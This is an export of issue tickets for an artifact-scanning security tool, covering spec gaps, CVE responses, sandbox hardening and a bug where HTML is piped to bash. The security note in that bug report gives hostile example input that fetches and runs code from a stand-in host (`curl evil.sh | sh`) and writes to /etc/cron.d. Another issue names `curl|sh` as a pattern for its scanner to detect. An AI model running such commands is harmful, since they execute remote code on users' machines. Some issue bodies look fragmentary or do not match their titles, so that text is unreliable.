- Socket.dev deprecated their own npm wrapper in favor of registry proxy mode
- pip-audit explicitly disclaims malicious-package defense
- LD_PRELOAD: trivially bypassed (static bins, setuid, unset env)
- eBPF: good for audit/detection, not a pre-exec gate
- fanotify FAN_OPEN_EXEC_PERM: needs CAP_SYS_ADMIN/root, collides with ADR-0009

## Acceptance criteria

- [ ] ADR drafted: threat model, platform support (Linux only; macOS/Windows alternatives), seccomp-notify lifecycle, policy model, performance impact
- [ ] Prototype: simple `cargo install` or `npm install` with seccomp-notify supervisor
- [ ] Comparison table: PATH wrapper vs registry proxy vs seccomp-notify vs bwrap/container

## Effort: L (research + ADR + prototype)
## Priority: P3 (research, not blocking near-term work)

title: feat(intel): Homebrew integration via artifact proxy env vars (not wrapper)
body:
## Summary

Integrate Homebrew inspection via environment variable hooks (`HOMEBREW_BOTTLE_DOMAIN`, `HOMEBREW_ARTIFACT_DOMAIN`, `HOMEBREW_VERIFY_ATTESTATIONS`) rather than wrapping the `brew` binary. This is cleaner than a PATH wrapper.

## Context

Research-strategist finding from adversarial debate: "Homebrew is actually *better* than AUR because bottle/source fetch interception is clean via env vars." The wrapper approach (spec §39.11) is the wrong model — Homebrew already has clean hook points:

- `HOMEBREW_BOTTLE_DOMAIN` → redirect bottle downloads to your mirror/proxy
- `HOMEBREW_ARTIFACT_DOMAIN` → prefix all download URLs, incl source tarballs
- `HOMEBREW_ARTIFACT_DOMAIN_NO_FALLBACK=1` → fail closed instead of falling back
- `HOMEBREW_VERIFY_ATTESTATIONS=1` → provenance signal
- `HOMEBREW_REQUIRE_TAP_TRUST=1`, `HOMEBREW_ALLOWED_TAPS`, `HOMEBREW_FORBIDDEN_*`

For source builds: `brew fetch --force --deps foo` → inspect cache → `brew install foo`.

## Acceptance criteria

- [ ] Arbitraitor can act as a Homebrew artifact proxy (intercept bottle/tarball downloads)
- [ ] Policy can set `HOMEBREW_BOTTLE_DOMAIN` to point to Arbitraitor's local proxy
- [ ] Bottle SHA-256 verified + scanned pre-`pour`
- [ ] `brew fetch` → scan → `brew install` workflow documented

## Effort: M
## Priority: P3 (post-1.0 per §47.2)

title: feat(pm): AUR integration via paru pre_build_command (not wrapper)
body:
## Summary

Integrate AUR package inspection via `paru`'s `pre_build_command` hook and `makepkg --verifysource` checkpoint, NOT via wrapping the `yay`/`paru` binary. AUR PKGBUILDs are arbitrary bash — the wrapper model doesn't work.

## Context

Research-strategist finding from adversarial debate: "AUR is worst case. makepkg phases run arbitrary bash. No libmakepkg hook system. `paru` has `pre_build_command` — a first-class hook. `yay` needs shim/mflags path. `--verifysource` is the only clean pre-build checkpoint."

Key facts:
- `makepkg --nobuild` still runs `prepare()` — not safe
- `makepkg --verifysource` = download + integrity check, no extract/prepare/build
- PKGBUILD can specify `SKIP` checksums or malicious source URLs
- `paru` config: `makepkg_bin`, `makepkg_conf`, `mflags`, `pre_build_command`
- `libalpm` hooks are only pre/post pacman transaction (too late)

## Recommended approach

1. **paru first** (has `pre_build_command`); yay deferred
2. `pre_build_command = arbitraitor scan-pkgbuild` — scans PKGBUILD + .SRCINFO before build
3. Use `DLAGENTS` proxy for source download interception
4. `makepkg --verifysource` as clean checkpoint before any untrusted bash runs
5. **Always Prompt** before makepkg (AUR is highest-risk PM — never silent)

## Acceptance criteria

- [ ] `paru` config snippet documented (`pre_build_command = arbitraitor scan-pkgbuild`)
- [ ] PKGBUILD scanner: detects curl|sh, suspicious downloads, missing checksums, SKIP integrity
- [ ] Integration test: malicious PKGBUILD blocked before makepkg
- [ ] Docs: why wrapper model doesn't work for AUR

## Effort: L
## Priority: P3 (post-1.0 per §47.2)

title: bug(ci): nightly release has 0 binary assets despite successful builds
body:
## Problem

The nightly release at https://github.com/arbsec/arbitraitor/releases/tag/nightly shows only source code and release attestation — no built binaries. The build jobs succeed (3 targets, 6 files uploaded as artifacts) but the release action fails to attach them.

## Root cause

The `artifacts: dist/*` glob in `ncipollo/release-action` doesn't match the downloaded artifact files correctly.

## Fix

Use explicit extensions: `artifacts: "dist/*.tar.gz,dist/*.sha256"` instead of `artifacts: dist/*`.

title: docs(spec): reconcile spec v0.5→v0.6 — fix all known drift
body:
## Problem

The spec (v0.5, 7039 lines) has drift from reality discovered during the adversarial hyperplan review. Multiple sections reference wrong counts, phantom headings, stale implementation status, or conflicting scope.

## Known drift to fix

1. **Version bump**: 0.5 → 0.6, update date and changelog
2. **§28.1**: CLI implementation-status table says many subcommands "not yet implemented" — all 23 are implemented now
3. **§44.1**: Changelog claims §44.1 was added but no `### 44.1` heading exists in spec
4. **§42.7**: Says "21 accepted ADRs" — correct, but doesn't acknowledge 5 Proposed (0022-0026)

9. **Tech-stack.md**: Compression says `async-compression` but code uses sync crates; Wasmtime WASI Preview 2 wording stale; `goblin` and Sequoia listed but absent

title: feat(receipt): extend finding summaries to retain evidence and remediation
body:
## Problem

Receipt finding summaries currently drop evidence, remediation steps, references, and taxonomy mappings. Only id/category/severity/confidence/title/location survive. For a product whose value proposition is "explainable findings," this hollows out the core.

## What to implement

- Extend `FindingSummary` in `arbitraitor-receipt/src/lib.rs` to retain:
  - `evidence: Option<String>` — the matched pattern or suspicious code snippet
  - `remediation: Option<String>` — recommended fix
  - `references: Vec<String>` — CWE/CAPEC/OWASP links
  - `taxonomies: Vec<TaxonomyEntry>` — already defined in model, just not populated
- Update the FindingSummary builder to copy these from Finding
- Ensure JCS canonicalization handles the new fields
- Add tests verifying evidence round-trips through receipt

## Impact

This enables the §44 compliance mapping (ADR-0026), the §15.2 multi-taxonomy field, and the "explain" command's usefulness.

title: feat(pm): implement npm adapter with registry proxy and lifecycle enforcement
body:
## Problem

The `arbitraitor-package-manager` crate has recipe stubs for npm/pnpm/yarn/bun but no real implementation. The `shim install` command generates broken commands. Spec §39.14 defines a binding hybrid integration pattern that has never been proven end-to-end.

## What to implement (npm as proof of concept)

1. **Registry proxy mode**: local HTTP proxy that intercepts npm registry requests, scans tarballs before extraction
2. **Lockfile pre-scan**: parse `package-lock.json`, check each dependency against intel feeds
3. **Lifecycle script enforcement**: enforce `--ignore-scripts` by default, scan `postinstall`/`preinstall` scripts when present
4. **Post-install scan**: scan the installed `node_modules/` tree for suspicious patterns
5. **`pm run` CLI subcommand**: wire the adapter through `arbitraitor pm run --tool npm -- install <pkg>`
6. **`shim install npm`**: generate working shim that invokes `arb pm run --tool npm`

## Why npm first

- Largest ecosystem, most lifecycle script attacks
- Socket.dev deprecated their wrapper in favor of proxy mode — validates the approach
- The §39.14 hybrid pattern (proxy + lockfile + lifecycle + post-install) is most clearly defined for npm

## Acceptance criteria

- [ ] `arbitraitor pm run --tool npm -- install left-pad` succeeds for a safe package
- [ ] Malicious postinstall script is detected and blocked by default
- [ ] Receipt records the npm-specific evidence (package name, version, script content)
- [ ] Other PM adapters follow the same pattern

title: bug(cli): inspect command doesn't work with local files

title: bug(sandbox): script execution has no filesystem confinement

## Problem

Apply Landlock filesystem isolation (Linux) to restrict script access to its working directory and temp home only.

title: epic: v0.6+ spec gap reconciliation — 70 gaps from audit + 2025-2026 research
body:
## Summary

Comprehensive spec-vs-code audit (2026-07-20) plus 2025-2026 external research surfaced ~70 concrete gaps across the v0.5 spec. This epic tracks reconciliation work to push the spec + codebase to v0.7 readiness.

## Audit methodology

- 6 parallel internal audits (fetch/SSRF, detectors, provenance/intel, plugin/MCP/PM, exec/sandbox/receipt/daemon/policy, CLI surface)
- 1 librarian external research sweep (2025-2026 standards, CVEs, regulations, OS features, modern malware)

## Findings categories

See child epics for grouped work:

1. **External research-driven spec updates** (21 gaps G1-G21) — 6 security-critical, 11 standard-gap, 4 nice-to-have
2. **CLI surface coverage (§28)** — 13 gaps, mostly HIGH severity
3. **Policy engine gaps** — 4 gaps, HIGH severity
4. **Receipt schema gaps** — 5 gaps, HIGH severity
5. **Fetch/retriever gaps** — 11 gaps, several security-critical
6. **Detector/analysis gaps** — 12 gaps, including dep-vuln and SBOM/VEX
7. **Provenance/update/intel gaps** — 18 gaps, HIGH severity
8. **Plugin/wrapper/MCP/package-manager gaps** — 8 gaps, HIGH severity (npm-only)
9. **Exec/sandbox/daemon gaps** — 18 gaps including sandbox modes + capabilities

## Exit criteria

Audit source data: compressed findings saved at /tmp/arb-backlog (ephemeral).

title: research(spec): §14.7 build-environment vs publisher-identity (Mini Shai-Hulud gap)
body:
- Spec gap G1 (security-critical, 2025-2026 research).

## Context

Sigstore/cosign attestations prove *who* signed, not *what the build environment executed*. Mini Shai-Hulud (May 2026) compromised 84 TanStack packages + ≥170 npm/PyPI packages by hijacking legitimate OIDC publisher identity via `pull_request_target` → cache poisoning → `/proc/self/mem` OIDC-token extraction. Malicious versions carried valid SLSA Build L3 attestations because the workflow was the attacker code path.

## Sources

- CSA Mini Shai-Hulud Research Note (2026-05-15)
- TanStack postmortem (Lemma Critical Brief 014)
- GHSA-g7cv-rxg3-hmpx (CVE-2026-45321)

## Spec extension

Add §14.7 "Publisher-identity vs build-environment boundary" that requires:
- `verification_scope: { publisher_identity: true, build_environment: false }` receipt field
- §14.5 precedence reframes: SLSA Provenance with `builder.id + resolvedDependencies` match = "fully provenanced"; publisher-only signature = reduced weight
- §41.19 CI trust foundation extension: no shared cache between `pull_request_target` and tag/release jobs; `id-token: write` narrowly scoped; OIDC audience pinned

## Why Arbitraitor

Users run Arbitraitor *before* executing the artifact. A passing cosign/identity check gives false confidence unless build-environment integrity is surfaced separately.

## Acceptance

- [ ] §14.7 added with publisher-identity vs build-environment semantics
- [ ] Receipt schema carries `verification_scope` field
- [ ] §41.19 extended with OIDC-token-extraction mitigations
- [ ] Tests prove a "publisher-only" signature downgrades but does not block

title: feat(provenance): §14.2.1 Rekor v2 GA support (tile-based merkle, hashedrekord-only)
body:
- Spec gap G2 (security-critical, 2025 standard update).

## Context

Rekor v2 GAed 2025-10-10 with substantial breaking changes:
- Tile-backed merkle tree
- Only `hashedrekord v0.0.2` entry kind; dropped `intoto/rekord/jar/rpm/cose/alpine/helm/tuf/rfc3161`
- No Signed Entry Timestamps (caller must fetch RFC3161 TSA)
- Shard URLs distributed via SigningConfig with TTLs
- Multiple TLE forms

Older clients verify v2 entries incorrectly or fail closed.

## Sources

- Rekor v2 GA blog (2025-10-10): https://blog.sigstore.dev/rekor-v2-ga/
- Rekor v2 spec: https://github.com/sigstore/architecture-docs/blob/main/rekor-v2-spec.md
- protobuf-specs tracking issue #633

## Spec extension

§14.2.1 rename to "Sigstore Bundle verification profile (v0.5→v0.6)" with v1/v2 dual-log transition matrix. `tlog_entries` field becomes array of `{log_id, major_api_version, entry_kind, log_index, inclusion_proof_checkpoint_key_id, rfc3161_timestamp_present}`. Fail-closed on dropped v1 entry kinds because they are no longer verifiable through public logs.

## Why Arbitraitor

A v2-signed artifact currently returns verification errors or, worse, silently verifies an unrelated transparency-log entry (cf. CVE-2026-22703 regression class).

## Acceptance

- [ ] §14.2.1 amended with v1/v2 dual-log transition matrix
- [ ] `tlog_entries` receipt field expanded per spec
- [ ] Verify path handles both v1 and v2 entries
- [ ] Receipts record major API version per entry

title: security(provenance): pin cosign/sigstore-rust + record verifier_identity (CVE-2026-22703, CVE-2026-24122)
body:
- Spec gap G3 (security-critical, 2026 CVEs).

## Context

Two recent cosign vulnerabilities affect verification correctness:
- **CVE-2026-22703 (Jan 13 2026)**: `VerifyBundle` accepted any valid Rekor entry even when its body did not reference the artifact's digest/signature/key (regression of GHSA-8gw7-4j42-w388). Patched in cosign v2.6.2 and v3.0.4.
- **CVE-2026-24122 (Feb 19 2026)**: certificate-expiry logic accepts leaf certs whose issuing/root CA had already expired by the timestamp used for verification. Patched in cosign v3.0.5.

## Sources

- GHSA-whqx-f9j3-ch6m (CVE-2026-22703)
- GHSA-wfqv-66vq-46rm (CVE-2026-24122)
- GO-2026-4309
- Snyk SNYK-GOLANG-...-14912564

## Spec extension

§41.12 "Sigstore" should declare minimum cosign version with documented backport set. §14.3 verification pre-condition: refuse to evaluate sigstore bundles on a sigstore-rust/cosign Cargo.lock or go.mod whose pins are below the patched floor. Receipts add `sigstore_bundle.verifier_identity` recording the cosign/sigstore-rust commit SHA used for verification.

## Why Arbitraitor

If the verifier silently accepts bundles that should be rejected, bytes reach execution with a false receipt — violating invariant 1.

## Acceptance

- [ ] §41.12 minimum cosign version declared
- [ ] §14.3 verification pre-condition specifies Cargo.lock pin floor
- [ ] Receipt schema includes `verifier_identity` field
- [ ] doctor checks cosign version on PATH

title: feat(sandbox): §27.3 runc CVE cluster awareness (2025-11-05 container escapes)
body:
- Spec gap G4 (security-critical, 2025 CVEs).

## Context

Three runc CVEs disclosed 2025-11-05 enable full container escape from a Dockerfile using `RUN --mount=…`:
- **CVE-2025-31133**: `/dev/null` masked-path race
- **CVE-2025-52565**: `/dev/console` bind-mount race  
- **CVE-2025-52881**: procfs write redirection bypassing LSM labels, giving read-write access to `/proc/sysrq-trigger` (host crash) and `/proc/sys/kernel/core_pattern` (host root via kernel core-pattern upcall)

All chained from one attacker-controlled Dockerfile. Patched in runc 1.2.8 / 1.3.3 / 1.4.0-rc.3.

## Sources

- GHSA-9493-h29p-rfm2
- GHSA-cgrx-mc8f-2prm
- CNCF technical overview (2025-11-28)

## Spec extension

§19.4 add §19.6 "Container image threat surface" flagging OCI images referencing these CVEs in annotations or with RUN-mount gadget manifest refs. §27.3 sandbox adapter: when dispatching observed artifact to container runtime, record runc version in receipt, refuse to claim `filesystem_isolation` on patched runc < 1.2.8 / 1.3.3. Detect `RUN --mount=` patterns in Dockerfiles during script analysis.

## Acceptance

- [ ] §19.6 added
- [ ] §27.3 records runc version in receipt
- [ ] Receipt validation refuses `filesystem_isolation: true` for vulnerable runc
- [ ] Shell/archive analysis recognizes `RUN --mount=` patterns

title: security(archive): §19.1 tar parser consensus check (CWE-436, differential parsing)
body:
- Spec gap G5 (security-critical, 2026 CVEs).

## Context

PAX-extended-header `size=` value is being applied by some parsers to intermediary extension headers (`L/K/x/g`) where POSIX says it should apply only to the file entry. Result: one archive extracts to different membership sets in different parsers — letting an attacker show "clean" to scanner while extractor pulls the malicious payload.

Affected:
- node-tar CVE-2026-53655
- tar-rs (Rust) 
- node-tar CVE-2026-31802 (symlink drive-relative path traversal)
- CVE-2025-45582 (GNU tar two-step `../` symlink)

## Sources

- GHSA-vmf3-w455-68vh (CVE-2026-53655)
- GHSA-9ppj-qmqm-q256 (CVE-2026-31802)
- GHSA-3pv8-6f4r-ffg2 (tar-rs PAX desync)
- CVE-2025-45582 (GNU tar)

## Spec extension

§19.1 add **Parser consensus check**: when Arbitraitor's archive-parser walk produces different member list from an independent reference parser (libarchive / Python `tarfile`), raise `parser_differential` finding (CWE-436) and refuse to release. Pin minimum version of any embedded tar crate to patched floor. §19.3 add `parser_smelting` hazard distinct from path-traversal.

## Why Arbitraitor

"Scan once, execute the same bytes" invariant requires scanner and extractor to see the same archive. Differential enables exactly the inverse.

## Acceptance

- [ ] §19.1 parser consensus check added
- [ ] `parser_differential` finding category added
- [ ] §19.3 `parser_smelting` hazard defined
- [ ] tar-rs version pinraised in Cargo.lock + checked in doctor

title: feat(mcp): §33.5 composed prompt-injection defenses (Tool-Input/Output firewalls)
body:
- Spec gap G6 (security-critical, 2025-2026 research).

## Context

§33.5 currently says "minimize authority surface." The 2025-2026 peer-reviewed literature converged on a deployable defense primitive: pair-of-LLM-call-time firewalls — *Tool-Input firewall (Minimizer)* strips private-info args from tool calls; *Tool-Output firewall (Sanitizer)* scrubs injected instructions from tool responses before they re-enter model context. Reports 0% ASR across AgentDojo, Agent Security Bench, InjecAgent, τ-Bench while preserving utility. Adjacent work: MELON re-execution agreement (ICML 2025), IPIGuard planned-TDG with Fake Tool Invocation (EMNLP 2025). Demonstrated bypassable under adaptive attack individually.

## Sources

- arXiv:2510.05244 (Oct 2025)
- MELON ICML 2025 (PMLR v267)
- IPIGuard EMNLP 2025
- NAACL Findings 2025 "Adaptive Attacks Break Defenses"

## Spec extension

§33.5 grows into **§33.5 Prompt-injection resistance — composed defenses**:
1. Tool-output Sanitizer (subprocess that receives tool-return values, returns censored redacted values per §25.0 before LLM sees it)
2. Tool-input Minimizer (subprocess that strips private info from tool-call args)
3. §43.6 adversarial testing requires GCG-style adversarial suffix tests for any defense Arbitraitor claims

## Why Arbitraitor

MCP server §33 is the natural integration point. MCP `resources/read` and `tools/call` boundaries are exactly the firewall placement.

## Acceptance

- [ ] §33.5 expanded with Tool-Input/Output firewall model
- [ ] Trait defined for Sanitizer and Minimizer subprocess plugins
- [ ] §43.6 includes adaptive-attack test corpus requirement

title: docs(spec): §14.6 update SLSA v1.2 final (Nov 2025) + Source Track
body:

## Context

SLSA v1.2 final published 2025-11-24, adding a new **Source Track** (L1/L2/L3) addressing source-code authoring/review threats. §14.6 still cites `v1.2-rc2` URL.

- https://slsa.dev/spec/v1.2/whats-new

Bump §14.6 URL. Add §14.6.1 Source Track consumption sub-section: arbitrate Source L2+ evidence (`branch-protection`, source-contributor identity, two-party review, technical controls) as stronger provenance signal than Build L1 alone.

## Acceptance

- [ ] §14.6.1 Source Track consumption semantics added
- [ ] Example builder identities updated

title: feat(plugin): §41.9.1 WASI 0.3 / Component Model async stability
body:
- Spec gap G8 (standard-gap, 2026 WASI stable release).

## Context

WASI 0.3.0 ratified 2025-06-11 by WASI Subgroup. Rebases WASI onto Component Model's native async — `async func`, `stream<>`, `future<>` canonical-ABI primitives. `wasi:io` removed (folded into ABI). Changes WIT interfaces third-party `arbitrator-plugin` would import in Wasmtime 46+. `wasi:http` introduces `service` and `middleware` worlds re-organizing `proxy`-style chaining.

## Sources

- https://bytecodealliance.org/articles/WASI-0.3 (2026-06-11)
- https://github.com/webassembly/wasi/releases/tag/v0.3.0
- https://wasi.dev/roadmap

§41.9.1 declare Wasmtime-versioned WASI ABI: e.g. "primary runtime: Wasmtime ≥46.0 + Component Model ≥0.3.0; WIT package versions pinned; provided-bindings list updated to reflect service/middleware worlds." §41.9.2 WIT interfaces list which `wasi:*` interfaces Arbitraitor exposes are v0.3-stable. Subprocess fallback (§41.9.3) is the migration path if host lacks Wasmtime ≥46.

## Acceptance

- [ ] §41.9.1 amended with WASI 0.3 + Wasmtime ≥46 floor
- [ ] §41.9.2 lists v0.3-stable wasi:* interfaces
- [ ] Tests verify component-async primitives compile

title: security(plugin): §41.9.1 Wasmtime April 2026 critical CVE risk register
body:
- Spec gap G9 (standard-gap, requires spec change).

## Context

Two Critical (CVSS 9.0) Wasmtime CVEs on 2026-04-09:
- **CVE-2026-34971**: Cranelift aarch64 heap access miscompilation enabling sandbox escape
- **CVE-2026-34987**: Winch compiler backend allowed sandbox-escaping memory access

Both arbitrary read+write to host memory. Spec treats Wasmtime as primary plugin runtime but has no risk register tying compiler/backend selection to security guarantees.

## Sources

- Wasmtime advisories (2026-04-09)
- GHSA-jhxm-h53p-jm7w / CVE-2026-34971
- GHSA-xx5w-cvp6-jv83 / CVE-2026-34987

## Spec extension

§41.9.1 add Wasmtime risk register subsection: each compiler backend (Cranelift, Winch) and each backing architecture gets CVE-list reference + minimum version. Receipts for `arbitraitor scan` and plugin-loaded artifacts record `wasmtime_version`, `compiler_backend`, `memory64`, `signals_based_traps`, `spectre_mitigations`. Policy rule refuses plugins whose `wasmtime_version < 43.0.1`.

## Acceptance

- [ ] §41.9.1 risk register added
- [ ] Receipt field records wasmtime version + backend
- [ ] Policy refuses unpatched wasmtime plugin loads

title: feat(sandbox): §27.3 Linux io_uring restrictions (bypasses seccomp)
body:
- Spec gap G10 (standard-gap, OS hardening miss).

## Context

io_uring bypasses seccomp (queued ops execute in kernel without syscall filter) and accumulated >100 CVEs since 2019. ChromeOS, Android, Docker Desktop disable for unprivileged; major distros restrict in containers. Kernel ships `kernel.io_uring_disabled` sysctl since 6.6 (backported to RHEL 9.4 / Ubuntu 24.04). Grsecurity/Oxidation add per-task opcode restrictions (`IORING_REGISTER_RESTRICTIONS`). January 2026 patchsets inherit task-level restrictions + cBPF-style SQE-filtering.

Spec §27.3 lists seccomp among Linux adapters but does NOT mention io_uring — meaning any sandbox relying only on seccomp inherits the unprivileged io_uring syscall surface.

## Sources

- Torvalds commit enabling io_uring_disabled sysctl
- System Hardening 2026-04 io_uring article
- RFC patchset v7 inherited restrictions + BPF filtering

## Spec extension

§27.3 Linux adapters add mandatory bullet: refuse `io_uring_setup (425) / io_uring_enter (426) / io_uring_register (427)` from sandboxed children via seccomp profile; honor `kernel.io_uring_disabled ≥ 1`; otherwise set `IORING_REGISTER_RESTRICTIONS` denying `IORING_OP_OPENAT`, `IORING_OP_SOCKET`, etc.

§43.7 compatibility matrix adds io_uring-disabling posture row.

## Why Arbitraitor

A malicious script in a sandboxed shell that inherits a seccomp filter blocking `openat` can still escape by submitting SQE entries with `IORING_OP_OPENAT` — seccomp filter never sees them.

## Acceptance

- [ ] §27.3 io_uring restriction requirements added
- [ ] §43.7 io_uring posture row added
- [ ] Sandbox config blocks io_uring syscalls via seccomp
- [ ] Receipt records io_uring blocking posture

title: feat(sandbox): §27.3 user-namespace hardening (Ubuntu AppArmor + cap_userns)
body:
- Spec gap G11 (standard-gap, OS hardening).

## Context

Unprivileged user namespaces multiply kernel-attack-surface reachability by 3.4× (Edera 2026 analysis: 8 of 40 gated kernel ops reachable without userns vs 27 of 40 with). Ubuntu 23.10+ ships AppArmor-mediated restriction (`kernel.apparmor_restrict_unprivileged_unconfined=1`). Kernel-side `cap_userns` patchset (June 2024, still v2 RFC) introduces `PR_CAP_USERNS`. Qualys TRU disclosed 3 bypasses of Ubuntu restriction March 2025.

Spec §27.3 does not mention user namespaces or their restriction.

## Sources

- Ubuntu restricted unprivileged user namespaces (blog)
- Qualys TRU 3 bypasses (2025-03-27)
- LWN cap_userns coverage
- System Hardening 2026-05

## Spec extension

§27.3 add bullet on `user.max_user_namespaces=0` plus `kernel.unprivileged_userns_clone=0` for `restricted` mode; refuse rootless-container mediation if policy says `contained` but userns is unconstrained. §43.7 tests should include kernels where `user.max_user_namespaces > 0` and warn.

43% of netfilter CVEs 2020-2025 required user namespaces for exploitation.

## Acceptance

- [ ] §27.3 user-namespace hardening bullet added
- [ ] §43.7 cross-platform matrix includes userns posture
- [ ] Receipt records effective userns posture

title: feat(sandbox): §27.3 Landlock ABI v7-v10 enumeration (audit, TSYNC, UDP)
body:
- Spec gap G12 (standard-gap, OS feature gap).

## Context

Current Linux kernel has 8 Landlock ABIs beyond what spec implies:
- ABI v4: TCP connect/bind (v6.7)
- ABI v5: IOCTL device (v6.10)
- ABI v6: Signal scope + abstract UNIX socket (v6.12)
- ABI v7: Audit log (v6.15)
- ABI v8: TSYNC flag on `landlock_restrict_self` (v7.0-rc)
- ABI v9: RESOLVE_UNIX (behind v6.13+ patches)
- ABI v10: UDP connect/bind (v6.16)

Spec §27.3 just says "Landlock."

## Sources

- Landlock kernel docs (latest)
- Landlock ABI versioning wiki
- Mickaël Salaün LSS EU 2025 talk

## Spec extension

§27.3 enumerate ABI matrix Arbitraitor uses: e.g. "Linux sandbox targets Landlock ABI ≥6 when available; ≥4 when host is pre-6.10; <4 means TCP connect/bind is not enforced, receipt records `effective_controls.network_isolation.port_constraint = unavailable` and verdict downgrades per §27.7."

## Acceptance

- [ ] §27.3 Landlock ABI matrix added
- [ ] Sandbox code probes ABI version
- [ ] Receipt records effective ABI

title: security(fetch): §11.4 cross-protocol credential leak (curl CVE-2025-14524)

Add \`arbitraitor wrap <tool> -- <args>\` subcommand per spec §28.7 (lines 2406-2417):
```
arbitraitor wrap curl -- -fsSL https://example.com/install.sh
```

- Hostname validation mandatory

body:

- enforce compressed and decoded size limits separately
- never buffer an unbounded response in RAM
- use \`bytes\` and bounded channels

- distinguish connect, first-byte, idle-read, and total deadlines

## Current

Streaming is bounded and direct-to-sink, but no cancellation-token plumbing and no first-byte timer.

## Acceptance

- [ ] Cancellation token threads through fetch+analysis
- [ ] Distinct connect / first-byte / idle-read / total deadlines enforced
- [ ] Compressed vs decoded size limits separate

title: fix(run): `arbitraitor run` pipes HTML/non-script artifacts to bash and reports misleading `write-script-stdin` failure
body:
## Summary

Running `arbitraitor run https://qlty.sh` (HTML page, 0 findings, Verdict: Pass) attempts to feed 39160 bytes of HTML to `/bin/bash` as a "script" and fails with:

```
execution error: script input I/O failure during write-script-stdin
```

Two compounding bugs cause the misleading error:

1. **No content-type gate before execution** — `arbitraitor run` picks `ExecutionMode::Script` for *every* non-native artifact, including `HtmlDocument`, `JsonDocument`, `GenericText`, archives, etc. It then pipes arbitrary bytes to `bash` as a script.
2. **Diagnostic loss on early child exit** — when `bash` exits before consuming the streamed script bytes (parse error on `<!DOCTYPE html>`, EPIPE on the stdin pipe), `ScriptExecution::execute` returns at `write_all` without ever reading the child's captured stdout/stderr. The actual root cause (whatever bash or `unshare` printed to stderr) is silently discarded, leaving the user with a generic I/O message.

## Reproduction

```sh
arbitraitor run https://qlty.sh
```

### Observed

```
Fetching https://qlty.sh...
  → sha256:1ca9ff91ec34671045daf3f2229044560670028ece7b9fe0ae6c43c0dea15175
  → 39160 bytes, text/html; charset=utf-8

Detecting threats...
  arbitraitor-analysis.artifact: 0 findings

Verdict: Pass (0 findings)
Plan: execute via /bin/bash with network isolated
execution error: script input I/O failure during write-script-stdin
```

Exit code: `1` (EXIT_EXECUTION_FAILED). No receipt is written.

### Expected

Either:
- Don't execute non-script artifacts at all: classify the artifact, see `HtmlDocument`, and either run nothing (Verdict-only report) or surface `RunFailure::Blocked("refusing to execute non-script artifact (html_document)")`.
- Or, if execution is attempted, surface the real reason it failed (bash parse error / unshare failure / etc.) instead of "script input I/O failure during write-script-stdin".

## Root cause

### Bug 1: No content-type gate before `ScriptExecution::bash().execute()`

`crates/arbitraitor-cli/src/run/mod.rs:161-165`:

```rust
let mode = if artifact.is_native {
    ExecutionMode::Native
} else {
    ExecutionMode::Script
};
```

`is_native_artifact` in `crates/arbitraitor-cli/src/run/run_services.rs:266-271` only matches `PeExecutable | ElfExecutable | MachOexecutable`. Everything else — including `ArtifactType::HtmlDocument`, `JsonDocument`, `XmlDocument`, `GenericText`, archives, compressed payloads, `Unknown` — falls through to `ExecutionMode::Script` and gets piped through `/bin/bash --noprofile --norc` in `run_services.rs:91-100`:

```rust
ExecutionMode::Script => {
    let execution = arbitraitor_exec::script::ScriptExecution::bash()
        .map_err(|error| RunFailure::Execution(error.to_string()))?
        .with_network_isolated(!network_allowed);
    execution
        .execute(&artifact.bytes)  // <-- arbitrary HTML bytes piped to bash
        .map(execution_output)
        .map_err(|error| RunFailure::Execution(error.to_string()))
}
```

So `arbitraitor run` will happily feed 39 KB of HTML to bash. There is no allowlist of executable content types (e.g. `ShellScript(_)`, `PowerShellScript`, `PythonScript`, `JavaScript`) and no decision branch for "not a script — refuse to execute".

**Security note:** this is not just a UX bug. HTML can accidentally be valid-ish bash. `<!DOCTYPE html>` triggers `bash: !DOCTYPE: No such file or directory`, but content like `<html>$(curl evil.sh | sh)</html>` or `<a href=...> > /etc/cron.d/x` would parse and run. The CLI should not be in the business of bash-feeding arbitrary text/markup.

### Bug 2: `execute()` discards the child's stderr/stdout when `write_all` fails

`crates/arbitraitor-exec/src/script.rs:232-253`:

```rust
if let Some(mut stdin) = child.stdin.take() {
    stdin
        .write_all(script_bytes)
        .map_err(|source| ExecError::ScriptIo {
            stage: "write-script-stdin",
            source,
        })?;
    stdin.flush().map_err(|source| ExecError::ScriptIo {
        stage: "flush-script-stdin",
        source,
    })?;
}

let (exit_code, stdout, stderr) =
    crate::spawn::read_with_limit(&mut child, self.output_limit())?;
```

Sequence on the failing `qlty.sh` run:

1. `command.spawn()` — spawns `unshare --user --map-current-user --net -- /bin/bash --noprofile --norc`.
2. `apply_limits_fenced` — SIGSTOP, prlimit, SIGCONT.
3. Bash reads from its stdin, parses the HTML, immediately errors on the first line (`bash: !DOCTYPE: No such file or directory` for the `<` redirection), eventually exits.
4. Parent still has ~39 KB queued in the stdin pipe. Pipe write end is now closed by the child side → `write_all` returns `Err(EPIPE / BrokenPipe)`.
5. `execute()` returns `ExecError::ScriptIo { stage: "write-script-stdin", source: BrokenPipe }` and **never reaches** `read_with_limit`. The child's stderr (with the actual parse error, plus any unshare diagnostic) is dropped on the floor.

The user-facing message surfaces the symptom (`write-script-stdin` I/O failure) but hides the cause. The same path also hides genuine sandbox failures — e.g. when `unshare --user` is denied by `/proc/sys/kernel/unprivileged_userns_clone=0` or by a container runtime that blocks `CLONE_NEWUSER`, the child exits before any script bytes are written, and the user sees the same useless `write-script-stdin` error.

## Fix directions

Two independent fixes. Either alone meaningfully improves the situation; both together prevent the misleading-error class entirely.

### Fix A — Gate execution by `ArtifactType` (`run` should refuse non-script artifacts)

In `crates/arbitraitor-cli/src/run/mod.rs` (or earlier, in `run_services::prepare_artifact`), compute the execution mode from `artifact.artifact_type` (already carried as a string from `format!("{:?}", result.classification.artifact_type)`):

- `ShellScript(_)` → `ExecutionMode::Script`
- `PeExecutable | ElfExecutable | MachOExecutable` → `ExecutionMode::Native`
- `PowerShellScript` → PowerShell exec path (already exists in `arbitraitor-exec`)
- `PythonScript` / `JavaScript` → `ExecutionMode::Script` via matching interpreter (`python3`, `node`) — or block until wired
- Everything else (`HtmlDocument`, `JsonDocument`, `XmlDocument`, `GenericText`, `GenericBinary`, archives, compressed, `Unknown`) → `RunFailure::Blocked("artifact type {type} is not executable; refusing to run")`.

This needs `InspectedArtifact` to carry `ArtifactType` (not just its stringified form) so the match is exhaustive rather than string-prefix.

### Fix B — Don't lose child stderr when `write_all` fails

In `crates/arbitraitor-exec/src/script.rs::execute`, when `write_all` or `flush` fails, still drain the child's stdout/stderr (via `read_with_limit`) and exit code, and include that captured output in the `ExecError::ScriptIo` variant (or a richer error variant) so the CLI can surface e.g.

```
